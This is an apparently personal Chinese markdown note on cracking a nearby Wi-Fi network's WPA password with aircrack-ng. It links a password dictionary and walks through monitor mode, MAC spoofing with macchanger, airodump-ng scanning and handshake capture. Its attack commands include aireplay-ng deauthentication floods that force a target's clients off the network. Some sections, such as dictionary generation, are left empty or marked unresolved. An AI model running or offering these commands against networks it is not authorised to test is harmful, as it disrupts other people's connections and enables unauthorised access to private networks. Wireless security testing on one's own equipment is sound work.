[安全渗透？](https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/50.html)
[wifi 字典](https://github.com/conwnet/wpa-dictionary)

wifi的客户端在这统一称为接入点。
连接wifi的机器统一称为客户端。
### 下载工具 aircrack

### 打开监听模式
```
airmon-ng start wlp  //wlp0 => wlp0mon
// 如果因为 rfkill 报错
rfkill lsit
rfkill unblock all
```
### 更改本机 MAC 地址
```
sudo apt-get install macchanger // 下载
macchanger wlp0mon // 查看本机 mac
ifconfig wlp0mon down  // 停止 wlp0mon 接口
macchanger --mac 11:22:33:44:55 wlp0mon
macchanger wlp0mon  // 查看 mac 地址是否更改
// ifconfig wlp3s0mon up ???? 需要吗
```
### 获取附近wifi
#### airodump-ng 输出信息的参数说明
- BSSID：无线的IP地址。
- PWR：网卡报告的信号水平。
-  Beacons：无线发出的通告编号。
-  Data：被捕获到的数据分组的数量，包括广播分组。
-  /s：过去10秒钟内每秒捕获数据分组的数量。
-  CH：信道号（从Beacons中获取）。
-  MB：无线所支持的最大速率。如果MB=11，它是802.11b；如果MB=22，它是802.11b+；如果更高就是802.11g。后面的点（高于54之后）表明支持短前导码。
-  ENC：使用的加密算法体系。OPN表示无加密。WEP？表示WEP或者WPA/WPA2模式，WEP（没有问号）表示静态或动态WEP。如果出现TKIP或CCMP，那么就是WPA/WPA2。
-  CIPHER：检测到的加密算法，是CCMP、WRAAP、TKIP、WEP和WEP104中的一个。典型的来说（不一定），TKIP与WPA结合使用，CCMP与WPA2结合使用。如果密钥索引值大于0，显示为WEP40。标准情况下，索引0-3是40bit，104bit应该是0。
-  AUTH：使用的认证协议。常用的有MGT（WPA/WPA2使用独立的认证服务器，平时我们常说的802.1x、radius和eap等）、SKA（WEP的共享密钥）、PSK（WPA/WPA2的预共享密钥）或者OPN（WEP开放式）。
-  ESSID：指所谓的SSID号。如果启用隐藏的SSID的话，它可以为空。这种情况下，airodump-ng试图从proberesponses和associationrequests中获取SSID。
-  STATION：客户端的MAC地址，包括连上的和想要搜索无线来连接的客户端。如果客户端没有连接上，就在BSSID下显示“notassociated”。
-  Rate：表示传输率。
-  Lost：在过去10秒钟内丢失的数据分组，基于序列号检测。它意味着从客户端来的数据丢包，每个非管理帧中都有一个序列号字段，把刚接收到的那个帧中的序列号和前一个帧中的序列号一减就能知道丢了几个包。
-  Frames：客户端发送的数据分组数量。
-  Probe：被客户端查探的ESSID。如果客户端正试图连接一个无线，但是没有连接上，那么就显示在这里。

#### 获取wifi
```
airodump-ng wlp0mon  //	查看附近wifi，选择目标，记录相关参数
```

### 获取目标wifi的握手信息
#### 暗中观察
```
airodump-ng --ivs -c 3 -w wifi_crack wlp0mon // 就那些参数（--ivs,有用的留下)
airodump-ng -w wifi_crack -c 3 --bssid AA:AA:AA:AA:AA wlp0mon  // 一样的，不用重复
//注意出现连接接入点的客户端（`STATION`）的Mac地址，下一步需要使用它的Mac地址。 持续监听....	

```
####  aireplay-ng 加快。。握手
##### [测试注入](https://www.aircrack-ng.org/doku.php?id=injection_test)
```
aireplay-ng -9 -e essid -a 00:de:ad:ca:fe:00 (-i ap_?) wlpmon
aireplay-ng -9 wlpmon
```
##### 迫使重连为上一步获取握手信息
```
// 伪造的身份验证数据包从您的计算机发送到连接到您尝试破解的网络的客户端
// 收到这样的数据包后，大多数客户端断开与网络的连接，并立即重新连接
// 这样就可以让 ariodump-ng 获取到握手信息
// 下面好几种方法，也不懂
aireplay-ng -0 2 -a AA:AA:AA:AA:AA -c BB:BB:BB:BB:BB wlp0mon //伪造接入点向客户端发送2个解除认证的数据包，可以增加这个数字...还是伪造接入点向客户端发送解除认证的数据包啊

aireplay-ng -0 2 -a AA:AA:AA:AA:AA wlp0mon // 广播解除认证数据包到所有连接的客户端(不是所有的客户端都会响应广播解除认证)

aireplay-ng -1 0 -a [BSSID] -h [our Chosen MAC address] -e [ESSID] [Interface]
aireplay-ng --dauth 1 -a [BSSID] -c [our Chosen MAC address] [Interface] // our Chosen Mac address 是我们本机的MAC地址(改过的：11:22:33:44:55)


```

aireplay-ng -3 -b AP的mac -h 客户端的mac mon0 


#### 错误
一直收到 [0 | 0 acss], 更新以下内核？ `更新kali，当前内核为5.2：apt update && apt dist-upgrade`
### 生成字典文件



### 其他
一般驱动不支持数据包注入，导致 aireplay-ng 不能发送包，所以需要[安装驱动补丁](http://www.aircrack-ng.org/doku.php?id=install_drivers)。

```
rfkill list
rfkill unblock all
airmon-ng check kill          (之后需要：NetworkManager start)
```

### 测试注入
搞不来



